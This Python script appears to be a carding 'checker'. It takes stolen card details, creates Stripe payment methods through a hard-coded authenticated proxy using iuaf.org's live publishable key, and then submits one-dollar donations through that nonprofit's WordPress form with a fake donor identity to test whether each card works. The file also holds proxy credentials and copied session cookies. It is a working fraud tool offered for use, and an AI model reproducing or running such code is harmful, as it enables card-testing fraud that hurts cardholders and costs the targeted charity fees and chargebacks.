import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	proxies = {
        'http': 'http://gzJwhw1tYL:3wf1q0rNVK@3.139.240.229:43036',
        'https': 'http://gzJwhw1tYL:3wf1q0rNVK@3.139.240.229:43036',
	}
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fiuaf.org&time_on_page=161480&key=pk_live_51MXKg9EutUtc9BMhgynUEVNo2DyFY1jIakVXSH2RtvDNnKfN7PDBx0mtbTZ69CTS67ajxGJWCy5y7JqVL5fpcSzF00ZsZYMlkC'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxies)
	
	pm = r1.json()['id']
	
	cookies = {
	    'pmpro_visit': '1',
	    '_ga': 'GA1.1.469017383.1735624378',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_first_add': 'fd%3D2024-12-31%2005%3A52%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fiuaf.org%2Fsupport-us%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36',
	    'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    'trx_addons_is_retina': '1',
	    '__stripe_mid': 'ba4a989e-6627-4e44-a37a-24f569dc9a5ebc56d7',
	    '__stripe_sid': '18d0f4b1-dff2-4547-ac72-58d5dc8463484729ed',
	    'fluentform_step_form_hash_6': '853cbdee-5a99-4de4-80ab-8da7c4e0a287',
	    '_ga_SZ53BX73G9': 'GS1.1.1735624378.1.1.1735624521.0.0.0',
	    'sbjs_current_add': 'fd%3D2024-12-31%2005%3A55%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fiuaf.org%2Fsupport-us%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fiuaf.org%2Fsupport-us%2F',
	}
	
	headers = {
	    'authority': 'iuaf.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'pmpro_visit=1; _ga=GA1.1.469017383.1735624378; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2024-12-31%2005%3A52%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fiuaf.org%2Fsupport-us%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; trx_addons_is_retina=1; __stripe_mid=ba4a989e-6627-4e44-a37a-24f569dc9a5ebc56d7; __stripe_sid=18d0f4b1-dff2-4547-ac72-58d5dc8463484729ed; fluentform_step_form_hash_6=853cbdee-5a99-4de4-80ab-8da7c4e0a287; _ga_SZ53BX73G9=GS1.1.1735624378.1.1.1735624521.0.0.0; sbjs_current_add=fd%3D2024-12-31%2005%3A55%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Fiuaf.org%2Fsupport-us%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fiuaf.org%2Fsupport-us%2F',
	    'origin': 'https://iuaf.org',
	    'pragma': 'no-cache',
	    'referer': 'https://iuaf.org/support-us/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1735624687591',
	}
	
	data = {
	    'data': 'ak_hp_textarea=&ak_js=1735624379549&__fluent_form_embded_post_id=6522&_fluentform_6_fluentformnonce=595b464754&_wp_http_referer=%2Fsupport-us%2F&input_radio=Individual%20-%20my%20own%20money&input_radio_1=no&custom-payment-amount=1&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser09%40gmail.com&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&input_radio_2=no&payment_method=stripe&terms-n-condition=on&description=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '6',
	}
	
	r2 = requests.post('https://iuaf.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data, proxies=proxies)
	
	return (r2.json())
